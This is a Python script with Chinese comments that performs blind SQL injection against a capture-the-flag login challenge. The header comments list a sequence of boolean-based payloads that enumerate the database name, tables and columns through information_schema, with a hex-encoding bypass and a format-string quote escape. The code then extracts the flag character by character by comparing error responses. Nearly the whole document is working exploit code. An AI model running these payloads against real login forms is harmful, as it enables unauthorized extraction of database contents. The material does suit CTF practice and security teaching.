#!/usr/bin/python
#coding:utf-8
#盲注脚本
#注入url：
#1.确定数据库名长度   username=admin%1$' and length(database())>=3#&password=122222 【3】
#2.确定数据库名：username=admin%1$' and ascii(substr(database(),1,1))>100#&password=122222  【&#99；&#116；&#102；】[ctf]
#3.确定表数量：username=admin%1$' and (select count(*) from information_schema.tables where table_schema=database())=2#&password=122222 【1】
#4.确定表名长度：username=admin%1$' and length((select (table_name) from information_schema.tables where table_schema=database() limit 1))=4#&password=122222  【4】
#5.确定表名：username=admin%1$' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),1,1))=102#&password=122222    【&#102；&#108；&#97；103】【flag】
#6.确定字段数量： username=admin%1$' and (select count(column_name) from information_schema.columns where table_name=0x666c6167)=1#&password=122222 【1】(十六进制编码绕过)
#7.确定字段名长度：username=admin%1$' and length((select column_name from information_schema.columns where table_name=0x666c6167))=4#&password=122222  【4】
#8.确定字段名：  username=admin%1$' and ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167),1,1))<103#&password=122222     【102；108;97;103】
#7.枚举信息：username=admin%1$' and (select count(flag) from flag)>=1#&password=122222  【只有一条记录】
#           username=admin%1$' and length((select flag from flag))=42#&password=122222  【记录长度：42】
#           
import requests
import string 
def Main():
    # i = 1   #指字符串的第i位字符
    base_url = 'http://c07e51283c774469b53d729437b41db918dd64b21bfd4379.game.ichunqiu.com/index.php'    #基本url
    dic = string.letters + string.digits + "\{\}+-=/%&!@#$^&()*<>?"   #字典
    s = requests.session()
    error = "username error!"
    right = "password error!"

    
    ch = ''
    column_len = 42
    j = 10 
    for j in range(column_len+1):
        for i in dic:
            payload = "admin%1$\\' or "+ "ascii(substr((select flag from flag limit 1),"+str(j)+",1))="+str(ord(i))+"#"
            data = {'username':payload,'password':'123456'}
            res = s.post(base_url,data = data).content
            if right in res:
                ch = ch + i
                print j,':',ch
                break
        
      
    print ch
Main()
#注：字典要尽量全面，注意转义字符，否则可能会漏掉一些符号